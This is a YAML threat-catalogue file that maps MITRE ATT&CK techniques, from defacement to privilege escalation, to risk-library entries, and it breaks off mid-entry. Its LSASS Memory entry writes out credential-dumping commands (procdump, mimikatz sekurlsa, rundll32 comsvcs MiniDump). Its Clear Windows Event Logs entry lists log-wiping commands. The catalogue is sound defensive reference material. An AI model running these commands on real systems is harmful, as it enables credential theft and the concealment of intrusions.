  - urn: urn:intuitem:risk:threat:mitre-attack:t1491
    ref_id: T1491
    name: Defacement
    description: 'Adversaries may modify visual content available internally or externally
      to an enterprise network, thus affecting the integrity of the original content.
      Reasons for [Defacement](https://attack.mitre.org/techniques/T1491) include
      delivering messaging, intimidation, or claiming (possibly false) credit for
      an intrusion. Disturbing or offensive images may be used as a part of [Defacement](https://attack.mitre.org/techniques/T1491)
      in order to cause user discomfort, or to pressure compliance with accompanying
      messages.

      https://attack.mitre.org/techniques/T1491'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1535
    ref_id: T1535
    name: Unused/Unsupported Cloud Regions
    description: 'Adversaries may create cloud instances in unused geographic service
      regions in order to evade detection. Access is usually obtained through compromising
      accounts used to manage cloud infrastructure.


      Cloud service providers often provide infrastructure throughout the world in
      order to improve performance, provide redundancy, and allow customers to meet
      compliance requirements. Oftentimes, a customer will only use a subset of the
      available regions and may not actively monitor other regions. If an adversary
      creates resources in an unused region, they may be able to operate undetected.


      A variation on this behavior takes advantage of differences in functionality
      across cloud regions. An adversary could utilize regions which do not support
      advanced detection services in order to avoid detection of their activity.


      An example of adversary use of unused AWS regions is to mine cryptocurrency
      through [Resource Hijacking](https://attack.mitre.org/techniques/T1496), which
      can cost organizations substantial amounts of money over time depending on the
      processing power used.(Citation: CloudSploit - Unused AWS Regions)

      https://attack.mitre.org/techniques/T1535'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1557.003
    ref_id: T1557.003
    name: DHCP Spoofing
    description: "Adversaries may redirect network traffic to adversary-owned systems\
      \ by spoofing Dynamic Host Configuration Protocol (DHCP) traffic and acting\
      \ as a malicious DHCP server on the victim network. By achieving the adversary-in-the-middle\
      \ (AiTM) position, adversaries may collect network communications, including\
      \ passed credentials, especially those sent over insecure, unencrypted protocols.\
      \ This may also enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040)\
      \ or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).\n\
      \nDHCP is based on a client-server model and has two functionalities: a protocol\
      \ for providing network configuration settings from a DHCP server to a client\
      \ and a mechanism for allocating network addresses to clients.(Citation: rfc2131)\
      \ The typical server-client interaction is as follows: \n\n1. The client broadcasts\
      \ a `DISCOVER` message.\n\n2. The server responds with an `OFFER` message, which\
      \ includes an available network address. \n\n3. The client broadcasts a `REQUEST`\
      \ message, which includes the network address offered. \n\n4. The server acknowledges\
      \ with an `ACK` message and the client receives the network configuration parameters.\n\
      \nAdversaries may spoof as a rogue DHCP server on the victim network, from which\
      \ legitimate hosts may receive malicious network configurations. For example,\
      \ malware can act as a DHCP server and provide adversary-owned DNS servers to\
      \ the victimized computers.(Citation: new_rogue_DHCP_serv_malware)(Citation:\
      \ w32.tidserv.g) Through the malicious network configurations, an adversary\
      \ may achieve the AiTM position, route client traffic through adversary-controlled\
      \ systems, and collect information from the client network.\n\nDHCPv6 clients\
      \ can receive network configuration information without being assigned an IP\
      \ address by sending a <code>INFORMATION-REQUEST (code 11)</code> message to\
      \ the <code>All_DHCP_Relay_Agents_and_Servers</code> multicast address.(Citation:\
      \ rfc3315) Adversaries may use their rogue DHCP server to respond to this request\
      \ message with malicious network configurations.\n\nRather than establishing\
      \ an AiTM position, adversaries may also abuse DHCP spoofing to perform a DHCP\
      \ exhaustion attack (i.e, [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002))\
      \ by generating many broadcast DISCOVER messages to exhaust a network\u2019\
      s DHCP allocation pool.\nhttps://attack.mitre.org/techniques/T1557/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1563
    ref_id: T1563
    name: Remote Service Session Hijacking
    description: 'Adversaries may take control of preexisting sessions with remote
      services to move laterally in an environment. Users may use valid credentials
      to log into a service specifically designed to accept remote connections, such
      as telnet, SSH, and RDP. When a user logs into a service, a session will be
      established that will allow them to maintain a continuous interaction with that
      service.


      Adversaries may commandeer these sessions to carry out actions on remote systems.
      [Remote Service Session Hijacking](https://attack.mitre.org/techniques/T1563)
      differs from use of [Remote Services](https://attack.mitre.org/techniques/T1021)
      because it hijacks an existing session rather than creating a new session using
      [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: RDP Hijacking
      Medium)(Citation: Breach Post-mortem SSH Hijack)

      https://attack.mitre.org/techniques/T1563'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1027.001
    ref_id: T1027.001
    name: Binary Padding
    description: "Adversaries may use binary padding to add junk data and change the\
      \ on-disk representation of malware. This can be done without affecting the\
      \ functionality or behavior of a binary, but can increase the size of the binary\
      \ beyond what some security tools are capable of handling due to file size limitations.\
      \ \n\nBinary padding effectively changes the checksum of the file and can also\
      \ be used to avoid hash-based blocklists and static anti-virus signatures.(Citation:\
      \ ESET OceanLotus) The padding used is commonly generated by a function to create\
      \ junk data and then appended to the end or applied to sections of malware.(Citation:\
      \ Securelist Malware Tricks April 2017) Increasing the file size may decrease\
      \ the effectiveness of certain tools and detection capabilities that are not\
      \ designed or configured to scan large files. This may also reduce the likelihood\
      \ of being collected for analysis. Public file scanning services, such as VirusTotal,\
      \ limits the maximum size of an uploaded file to be analyzed.(Citation: VirusTotal\
      \ FAQ)\nhttps://attack.mitre.org/techniques/T1027/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1505.003
    ref_id: T1505.003
    name: Web Shell
    description: 'Adversaries may backdoor web servers with web shells to establish
      persistent access to systems. A Web shell is a Web script that is placed on
      an openly accessible Web server to allow an adversary to access the Web server
      as a gateway into a network. A Web shell may provide a set of functions to execute
      or a command-line interface on the system that hosts the Web server.(Citation:
      volexity_0day_sophos_FW)


      In addition to a server-side script, a Web shell may have a client interface
      program that is used to talk to the Web server (e.g. [China Chopper](https://attack.mitre.org/software/S0020)
      Web shell client).(Citation: Lee 2013)

      https://attack.mitre.org/techniques/T1505/003'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1484.001
    ref_id: T1484.001
    name: Group Policy Modification
    description: "Adversaries may modify Group Policy Objects (GPOs) to subvert the\
      \ intended discretionary access controls for a domain, usually with the intention\
      \ of escalating privileges on the domain. Group policy allows for centralized\
      \ management of user and computer settings in Active Directory (AD). GPOs are\
      \ containers for group policy settings made up of files stored within a predictable\
      \ network path `\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\`.(Citation: TechNet\
      \ Group Policy Basics)(Citation: ADSecurity GPO Persistence 2016) \n\nLike other\
      \ objects in AD, GPOs have access controls associated with them. By default\
      \ all user accounts in the domain have permission to read GPOs. It is possible\
      \ to delegate GPO access control permissions, e.g. write access, to specific\
      \ users or groups in the domain.\n\nMalicious GPO modifications can be used\
      \ to implement many other malicious behaviors such as [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053),\
      \ [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001),\
      \ [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105), [Create\
      \ Account](https://attack.mitre.org/techniques/T1136), [Service Execution](https://attack.mitre.org/techniques/T1569/002),\
      \  and more.(Citation: ADSecurity GPO Persistence 2016)(Citation: Wald0 Guide\
      \ to GPOs)(Citation: Harmj0y Abusing GPO Permissions)(Citation: Mandiant M Trends\
      \ 2016)(Citation: Microsoft Hacking Team Breach) Since GPOs can control so many\
      \ user and machine settings in the AD environment, there are a great number\
      \ of potential attacks that can stem from this GPO abuse.(Citation: Wald0 Guide\
      \ to GPOs)\n\nFor example, publicly available scripts such as <code>New-GPOImmediateTask</code>\
      \ can be leveraged to automate the creation of a malicious [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053)\
      \ by modifying GPO settings, in this case modifying <code>&lt;GPO_PATH&gt;\\\
      Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml</code>.(Citation: Wald0\
      \ Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions) In some cases an\
      \ adversary might modify specific user rights like SeEnableDelegationPrivilege,\
      \ set in <code>&lt;GPO_PATH&gt;\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf</code>,\
      \ to achieve a subtle AD backdoor with complete control of the domain because\
      \ the user account under the adversary's control would then be able to modify\
      \ GPOs.(Citation: Harmj0y SeEnableDelegationPrivilege Right)\nhttps://attack.mitre.org/techniques/T1484/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1217
    ref_id: T1217
    name: Browser Information Discovery
    description: 'Adversaries may enumerate information about browsers to learn more
      about compromised environments. Data saved by browsers (such as bookmarks, accounts,
      and browsing history) may reveal a variety of personal information about users
      (e.g., banking sites, relationships/interests, social media, etc.) as well as
      details about internal network resources such as servers, tools/dashboards,
      or other related infrastructure.(Citation: Kaspersky Autofill)


      Browser information may also highlight additional targets after an adversary
      has access to valid credentials, especially [Credentials In Files](https://attack.mitre.org/techniques/T1552/001)
      associated with logins cached by a browser.


      Specific storage locations vary based on platform and/or application, but browser
      information is typically stored in local files and databases (e.g., `%APPDATA%/Google/Chrome`).(Citation:
      Chrome Roaming Profiles)

      https://attack.mitre.org/techniques/T1217'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1552.004
    ref_id: T1552.004
    name: Private Keys
    description: "Adversaries may search for private key certificate files on compromised\
      \ systems for insecurely stored credentials. Private cryptographic keys and\
      \ certificates are used for authentication, encryption/decryption, and digital\
      \ signatures.(Citation: Wikipedia Public Key Crypto) Common key and certificate\
      \ file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer,\
      \ .p7b, .asc. \n\nAdversaries may also look in common key directories, such\
      \ as <code>~/.ssh</code> for SSH keys on * nix-based systems or <code>C:&#92;Users&#92;(username)&#92;.ssh&#92;</code>\
      \ on Windows. Adversary tools may also search compromised systems for file extensions\
      \ relating to cryptographic keys and certificates.(Citation: Kaspersky Careto)(Citation:\
      \ Palo Alto Prince of Persia)\n\nWhen a device is registered to Entra ID, a\
      \ device key and a transport key are generated and used to verify the device\u2019\
      s identity.(Citation: Microsoft Primary Refresh Token) An adversary with access\
      \ to the device may be able to export the keys in order to impersonate the device.(Citation:\
      \ AADInternals Azure AD Device Identities)\n\nOn network devices, private keys\
      \ may be exported via [Network Device CLI](https://attack.mitre.org/techniques/T1059/008)\
      \ commands such as `crypto pki export`.(Citation: cisco_deploy_rsa_keys) \n\n\
      Some private keys require a password or passphrase for operation, so an adversary\
      \ may also use [Input Capture](https://attack.mitre.org/techniques/T1056) for\
      \ keylogging or attempt to [Brute Force](https://attack.mitre.org/techniques/T1110)\
      \ the passphrase off-line. These private keys can be used to authenticate to\
      \ [Remote Services](https://attack.mitre.org/techniques/T1021) like SSH or for\
      \ use in decrypting other collected files such as email.\nhttps://attack.mitre.org/techniques/T1552/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1583.004
    ref_id: T1583.004
    name: Server
    description: "Adversaries may buy, lease, rent, or obtain physical servers\_that\
      \ can be used during targeting. Use of servers allows an adversary to stage,\
      \ launch, and execute an operation. During post-compromise activity, adversaries\
      \ may utilize servers for various tasks, such as watering hole operations in\
      \ [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), enabling\
      \ [Phishing](https://attack.mitre.org/techniques/T1566) operations, or facilitating\
      \ [Command and Control](https://attack.mitre.org/tactics/TA0011). Instead of\
      \ compromising a third-party [Server](https://attack.mitre.org/techniques/T1584/004)\
      \ or renting a [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003),\
      \ adversaries may opt to configure and run their own servers in support of operations.\
      \ Free trial periods of cloud servers may also be abused.(Citation: Free Trial\
      \ PurpleUrchin)(Citation: Freejacked) \n\nAdversaries may only need a lightweight\
      \ setup if most of their activities will take place using online infrastructure.\
      \ Or, they may need to build extensive infrastructure if they want to test,\
      \ communicate, and control other aspects of their activities on their own systems.(Citation:\
      \ NYTStuxnet)\nhttps://attack.mitre.org/techniques/T1583/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1021.006
    ref_id: T1021.006
    name: Windows Remote Management
    description: 'Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078)
      to interact with remote systems using Windows Remote Management (WinRM). The
      adversary may then perform actions as the logged-on user.


      WinRM is the name of both a Windows service and a protocol that allows a user
      to interact with a remote system (e.g., run an executable, modify the Registry,
      modify services).(Citation: Microsoft WinRM) It may be called with the `winrm`
      command or by any number of programs such as PowerShell.(Citation: Jacobsen
      2014) WinRM  can be used as a method of remotely interacting with [Windows Management
      Instrumentation](https://attack.mitre.org/techniques/T1047).(Citation: MSDN
      WMI)

      https://attack.mitre.org/techniques/T1021/006'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1011.001
    ref_id: T1011.001
    name: Exfiltration Over Bluetooth
    description: 'Adversaries may attempt to exfiltrate data over Bluetooth rather
      than the command and control channel. If the command and control network is
      a wired Internet connection, an adversary may opt to exfiltrate data using a
      Bluetooth communication channel.


      Adversaries may choose to do this if they have sufficient access and proximity.
      Bluetooth connections might not be secured or defended as well as the primary
      Internet-connected channel because it is not routed through the same enterprise
      network.

      https://attack.mitre.org/techniques/T1011/001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1078.001
    ref_id: T1078.001
    name: Default Accounts
    description: 'Adversaries may obtain and abuse credentials of a default account
      as a means of gaining Initial Access, Persistence, Privilege Escalation, or
      Defense Evasion. Default accounts are those that are built-into an OS, such
      as the Guest or Administrator accounts on Windows systems. Default accounts
      also include default factory/provider set accounts on other types of systems,
      software, or devices, including the root user account in AWS and the default
      service account in Kubernetes.(Citation: Microsoft Local Accounts Feb 2019)(Citation:
      AWS Root User)(Citation: Threat Matrix for Kubernetes)


      Default accounts are not limited to client machines, rather also include accounts
      that are preset for equipment such as network devices and computer applications
      whether they are internal, open source, or commercial. Appliances that come
      preset with a username and password combination pose a serious threat to organizations
      that do not change it post installation, as they are easy targets for an adversary.
      Similarly, adversaries may also utilize publicly disclosed or stolen [Private
      Keys](https://attack.mitre.org/techniques/T1552/004) or credential materials
      to legitimately connect to remote environments via [Remote Services](https://attack.mitre.org/techniques/T1021).(Citation:
      Metasploit SSH Module)

      https://attack.mitre.org/techniques/T1078/001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1547.003
    ref_id: T1547.003
    name: Time Providers
    description: 'Adversaries may abuse time providers to execute DLLs when the system
      boots. The Windows Time service (W32Time) enables time synchronization across
      and within domains.(Citation: Microsoft W32Time Feb 2018) W32Time time providers
      are responsible for retrieving time stamps from hardware/network resources and
      outputting these values to other network clients.(Citation: Microsoft TimeProvider)


      Time providers are implemented as dynamic-link libraries (DLLs) that are registered
      in the subkeys of `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\W32Time\TimeProviders\`.(Citation:
      Microsoft TimeProvider) The time provider manager, directed by the service control
      manager, loads and starts time providers listed and enabled under this key at
      system startup and/or whenever parameters are changed.(Citation: Microsoft TimeProvider)


      Adversaries may abuse this architecture to establish persistence, specifically
      by creating a new arbitrarily named subkey  pointing to a malicious DLL in the
      `DllName` value. Administrator privileges are required for time provider registration,
      though execution will run in context of the Local Service account.(Citation:
      Github W32Time Oct 2017)

      https://attack.mitre.org/techniques/T1547/003'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1546.005
    ref_id: T1546.005
    name: Trap
    description: 'Adversaries may establish persistence by executing malicious content
      triggered by an interrupt signal. The <code>trap</code> command allows programs
      and shells to specify commands that will be executed upon receiving interrupt
      signals. A common situation is a script allowing for graceful termination and
      handling of common keyboard interrupts like <code>ctrl+c</code> and <code>ctrl+d</code>.


      Adversaries can use this to register code to be executed when the shell encounters
      specific interrupts as a persistence mechanism. Trap commands are of the following
      format <code>trap ''command list'' signals</code> where "command list" will
      be executed when "signals" are received.(Citation: Trap Manual)(Citation: Cyberciti
      Trap Statements)

      https://attack.mitre.org/techniques/T1546/005'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1574.006
    ref_id: T1574.006
    name: Dynamic Linker Hijacking
    description: "Adversaries may execute their own malicious payloads by hijacking\
      \ environment variables the dynamic linker uses to load shared libraries. During\
      \ the execution preparation phase of a program, the dynamic linker loads specified\
      \ absolute paths of shared libraries from environment variables and files, such\
      \ as <code>LD_PRELOAD</code> on Linux or <code>DYLD_INSERT_LIBRARIES</code>\
      \ on macOS. Libraries specified in environment variables are loaded first, taking\
      \ precedence over system libraries with the same function name.(Citation: Man\
      \ LD.SO)(Citation: TLDP Shared Libraries)(Citation: Apple Doco Archive Dynamic\
      \ Libraries) These variables are often used by developers to debug binaries\
      \ without needing to recompile, deconflict mapped symbols, and implement custom\
      \ functions without changing the original library.(Citation: Baeldung LD_PRELOAD)\n\
      \nOn Linux and macOS, hijacking dynamic linker variables may grant access to\
      \ the victim process's memory, system/network resources, and possibly elevated\
      \ privileges. This method may also evade detection from security products since\
      \ the execution is masked under a legitimate process. Adversaries can set environment\
      \ variables via the command line using the <code>export</code> command, <code>setenv</code>\
      \ function, or <code>putenv</code> function. Adversaries can also leverage [Dynamic\
      \ Linker Hijacking](https://attack.mitre.org/techniques/T1574/006) to export\
      \ variables in a shell or set variables programmatically using higher level\
      \ syntax such Python\u2019s <code>os.environ</code>.\n\nOn Linux, adversaries\
      \ may set <code>LD_PRELOAD</code> to point to malicious libraries that match\
      \ the name of legitimate libraries which are requested by a victim program,\
      \ causing the operating system to load the adversary's malicious code upon execution\
      \ of the victim program. <code>LD_PRELOAD</code> can be set via the environment\
      \ variable or <code>/etc/ld.so.preload</code> file.(Citation: Man LD.SO)(Citation:\
      \ TLDP Shared Libraries) Libraries specified by <code>LD_PRELOAD</code> are\
      \ loaded and mapped into memory by <code>dlopen()</code> and <code>mmap()</code>\
      \ respectively.(Citation: Code Injection on Linux and macOS)(Citation: Uninformed\
      \ Needle) (Citation: Phrack halfdead 1997)(Citation: Brown Exploiting Linkers)\
      \ \n\nOn macOS this behavior is conceptually the same as on Linux, differing\
      \ only in how the macOS dynamic libraries (dyld) is implemented at a lower level.\
      \ Adversaries can set the <code>DYLD_INSERT_LIBRARIES</code> environment variable\
      \ to point to malicious libraries containing names of legitimate libraries or\
      \ functions requested by a victim program.(Citation: TheEvilBit DYLD_INSERT_LIBRARIES)(Citation:\
      \ Timac DYLD_INSERT_LIBRARIES)(Citation: Gabilondo DYLD_INSERT_LIBRARIES Catalina\
      \ Bypass)\nhttps://attack.mitre.org/techniques/T1574/006"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1136.001
    ref_id: T1136.001
    name: Local Account
    description: "Adversaries may create a local account to maintain access to victim\
      \ systems. Local accounts are those configured by an organization for use by\
      \ users, remote support, services, or for administration on a single system\
      \ or service. \n\nFor example, with a sufficient level of access, the Windows\
      \ <code>net user /add</code> command can be used to create a local account.\
      \ On macOS systems the <code>dscl -create</code> command can be used to create\
      \ a local account. Local accounts may also be added to network devices, often\
      \ via common [Network Device CLI](https://attack.mitre.org/techniques/T1059/008)\
      \ commands such as <code>username</code>, or to Kubernetes clusters using the\
      \ `kubectl` utility.(Citation: cisco_username_cmd)(Citation: Kubernetes Service\
      \ Accounts Security)\n\nSuch accounts may be used to establish secondary credentialed\
      \ access that do not require persistent remote access tools to be deployed on\
      \ the system.\nhttps://attack.mitre.org/techniques/T1136/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1092
    ref_id: T1092
    name: Communication Through Removable Media
    description: 'Adversaries can perform command and control between compromised
      hosts on potentially disconnected networks using removable media to transfer
      commands from system to system.(Citation: ESET Sednit USBStealer 2014) Both
      systems would need to be compromised, with the likelihood that an Internet-connected
      system was compromised first and the second through lateral movement by [Replication
      Through Removable Media](https://attack.mitre.org/techniques/T1091). Commands
      and files would be relayed from the disconnected system to the Internet-connected
      system to which the adversary has direct access.

      https://attack.mitre.org/techniques/T1092'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1070.001
    ref_id: T1070.001
    name: Clear Windows Event Logs
    description: 'Adversaries may clear Windows Event Logs to hide the activity of
      an intrusion. Windows Event Logs are a record of a computer''s alerts and notifications.
      There are three system-defined sources of events: System, Application, and Security,
      with five event types: Error, Warning, Information, Success Audit, and Failure
      Audit.



      With administrator privileges, the event logs can be cleared with the following
      utility commands:


      * <code>wevtutil cl system</code>

      * <code>wevtutil cl application</code>

      * <code>wevtutil cl security</code>


      These logs may also be cleared through other mechanisms, such as the event viewer
      GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example,
      adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code>
      to delete the Security EventLog and after reboot, disable future logging.  Note:
      events may still be generated and logged in the .evtx file between the time
      the command is run and the reboot.(Citation: disable_win_evt_logging)


      Adversaries may also attempt to clear logs by directly deleting the stored log
      files within `C:\Windows\System32\winevt\logs\`.

      https://attack.mitre.org/techniques/T1070/001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1585.002
    ref_id: T1585.002
    name: Email Accounts
    description: "Adversaries may create email accounts that can be used during targeting.\
      \ Adversaries can use accounts created with email providers to further their\
      \ operations, such as leveraging them to conduct [Phishing for Information](https://attack.mitre.org/techniques/T1598)\
      \ or [Phishing](https://attack.mitre.org/techniques/T1566).(Citation: Mandiant\
      \ APT1) Establishing email accounts may also allow adversaries to abuse free\
      \ services \u2013 such as trial periods \u2013 to [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)\
      \ for follow-on purposes.(Citation: Free Trial PurpleUrchin)\n\nAdversaries\
      \ may also take steps to cultivate a persona around the email account, such\
      \ as through use of [Social Media Accounts](https://attack.mitre.org/techniques/T1585/001),\
      \ to increase the chance of success of follow-on behaviors. Created email accounts\
      \ can also be used in the acquisition of infrastructure (ex: [Domains](https://attack.mitre.org/techniques/T1583/001)).(Citation:\
      \ Mandiant APT1)\n\nTo decrease the chance of physically tying back operations\
      \ to themselves, adversaries may make use of disposable email services.(Citation:\
      \ Trend Micro R980 2016)\nhttps://attack.mitre.org/techniques/T1585/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1557.001
    ref_id: T1557.001
    name: LLMNR/NBT-NS Poisoning and SMB Relay
    description: "By responding to LLMNR/NBT-NS network traffic, adversaries may spoof\
      \ an authoritative source for name resolution to force communication with an\
      \ adversary controlled system. This activity may be used to collect or relay\
      \ authentication materials. \n\nLink-Local Multicast Name Resolution (LLMNR)\
      \ and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve\
      \ as alternate methods of host identification. LLMNR is based upon the Domain\
      \ Name System (DNS) format and allows hosts on the same local link to perform\
      \ name resolution for other hosts. NBT-NS identifies systems on a local network\
      \ by their NetBIOS name. (Citation: Wikipedia LLMNR)(Citation: TechNet NetBIOS)\n\
      \nAdversaries can spoof an authoritative source for name resolution on a victim\
      \ network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they\
      \ know the identity of the requested host, effectively poisoning the service\
      \ so that the victims will communicate with the adversary controlled system.\
      \ If the requested host belongs to a resource that requires identification/authentication,\
      \ the username and NTLMv2 hash will then be sent to the adversary controlled\
      \ system. The adversary can then collect the hash information sent over the\
      \ wire through tools that monitor the ports for traffic or through [Network\
      \ Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes\
      \ offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to\
      \ obtain the plaintext passwords.\n\nIn some cases where an adversary has access\
      \ to a system that is in the authentication path between systems or when automated\
      \ scans that use credentials attempt to authenticate to an adversary controlled\
      \ system, the NTLMv1/v2 hashes can be intercepted and relayed to access and\
      \ execute code against a target system. The relay step can happen in conjunction\
      \ with poisoning but may also be independent of it.(Citation: byt3bl33d3r NTLM\
      \ Relaying)(Citation: Secure Ideas SMB Relay) Additionally, adversaries may\
      \ encapsulate the NTLMv1/v2 hashes into various protocols, such as LDAP, SMB,\
      \ MSSQL and HTTP, to expand and use multiple services with the valid NTLM response.\_\
      \n\nSeveral tools may be used to poison name services within local networks\
      \ such as NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174).(Citation:\
      \ GitHub NBNSpoof)(Citation: Rapid7 LLMNR Spoofer)(Citation: GitHub Responder)\n\
      https://attack.mitre.org/techniques/T1557/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1222
    ref_id: T1222
    name: File and Directory Permissions Modification
    description: "Adversaries may modify file or directory permissions/attributes\
      \ to evade access control lists (ACLs) and access protected files.(Citation:\
      \ Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018)\
      \ File and directory permissions are commonly managed by ACLs configured by\
      \ the file or directory owner, or users with the appropriate permissions. File\
      \ and directory ACL implementations vary by platform, but generally explicitly\
      \ designate which users or groups can perform which actions (read, write, execute,\
      \ etc.).\n\nModifications may include changing specific access rights, which\
      \ may require taking ownership of a file or directory and/or elevated permissions\
      \ depending on the file or directory\u2019s existing permissions. This may enable\
      \ malicious activity such as modifying, replacing, or deleting specific files\
      \ or directories. Specific file and directory modifications may be a required\
      \ step for many techniques, such as establishing Persistence via [Accessibility\
      \ Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization\
      \ Scripts](https://attack.mitre.org/techniques/T1037), [Unix Shell Configuration\
      \ Modification](https://attack.mitre.org/techniques/T1546/004), or tainting/hijacking\
      \ other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).\n\
      \nAdversaries may also change permissions of symbolic links. For example, malware\
      \ (particularly ransomware) may modify symbolic links and associated settings\
      \ to enable access to files from local shortcuts with remote paths.(Citation:\
      \ new_rust_based_ransomware)(Citation: bad_luck_blackcat)(Citation: falconoverwatch_blackcat_attack)(Citation:\
      \ blackmatter_blackcat)(Citation: fsutil_behavior)\nhttps://attack.mitre.org/techniques/T1222"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1003.001
    ref_id: T1003.001
    name: LSASS Memory
    description: 'Adversaries may attempt to access credential material stored in
      the process memory of the Local Security Authority Subsystem Service (LSASS).
      After a user logs on, the system generates and stores a variety of credential
      materials in LSASS process memory. These credential materials can be harvested
      by an administrative user or SYSTEM and used to conduct [Lateral Movement](https://attack.mitre.org/tactics/TA0008)
      using [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550).


      As well as in-memory techniques, the LSASS process memory can be dumped from
      the target host and analyzed on a local system.


      For example, on the target host use procdump:


      * <code>procdump -ma lsass.exe lsass_dump</code>


      Locally, mimikatz can be run using:


      * <code>sekurlsa::Minidump lsassdump.dmp</code>

      * <code>sekurlsa::logonPasswords</code>


      Built-in Windows tools such as `comsvcs.dll` can also be used:


      * <code>rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump PID  lsass.dmp
      full</code>(Citation: Volexity Exchange Marauder March 2021)(Citation: Symantec
      Attacks Against Government Sector)


      Similar to [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012),
      the silent process exit mechanism can be abused to create a memory dump of `lsass.exe`
      through Windows Error Reporting (`WerFault.exe`).(Citation: Deep Instinct LSASS)


      Windows Security Support Provider (SSP) DLLs are loaded into LSASS process at
      system start. Once loaded into the LSA, SSP DLLs have access to encrypted and
      plaintext passwords that are stored in Windows, such as any logged-on user''s
      Domain password or smart card PINs. The SSP configuration is stored in two Registry
      keys: <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code>
      and <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages</code>.
      An adversary may modify these Registry keys to add new SSPs, which will be loaded
      the next time the system boots, or when the AddSecurityPackage Windows API function
      is called.(Citation: Graeber 2014)


      The following SSPs can be used to access credentials:


      * Msv: Interactive logons, batch logons, and service logons are done through
      the MSV authentication package.

      * Wdigest: The Digest Authentication protocol is designed for use with Hypertext
      Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.(Citation:
      TechNet Blogs Credential Protection)

      * Kerberos: Preferred for mutual client-server domain authentication in Windows
      2000 and later.

      * CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop
      Services.(Citation: TechNet Blogs Credential Protection)

      https://attack.mitre.org/techniques/T1003/001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1595
    ref_id: T1595
    name: Active Scanning
    description: 'Adversaries may execute active reconnaissance scans to gather information
      that can be used during targeting. Active scans are those where the adversary
      probes victim infrastructure via network traffic, as opposed to other forms
      of reconnaissance that do not involve direct interaction.


      Adversaries may perform different forms of active scanning depending on what
      information they seek to gather. These scans can also be performed in various
      ways, including using native features of network protocols such as ICMP.(Citation:
      Botnet Scan)(Citation: OWASP Fingerprinting) Information from these scans may
      reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)
      or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)),
      establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587)
      or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or
      initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)
      or [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)).

      https://attack.mitre.org/techniques/T1595'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1548
    ref_id: T1548
    name: Abuse Elevation Control Mechanism
    description: 'Adversaries may circumvent mechanisms designed to control elevate
      privileges to gain higher-level permissions. Most modern systems contain native
      elevation control mechanisms that are intended to limit privileges that a user
      can perform on a machine. Authorization has to be granted to specific users
      in order to perform tasks that can be considered of higher risk.(Citation: TechNet
      How UAC Works)(Citation: sudo man page 2018) An adversary can perform several
      methods to take advantage of built-in control mechanisms in order to escalate
      privileges on a system.(Citation: OSX Keydnap malware)(Citation: Fortinet Fareit)

      https://attack.mitre.org/techniques/T1548'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1134.002
    ref_id: T1134.002
    name: Create Process with Token
    description: 'Adversaries may create a new process with an existing token to escalate
      privileges and bypass access controls. Processes can be created with the token
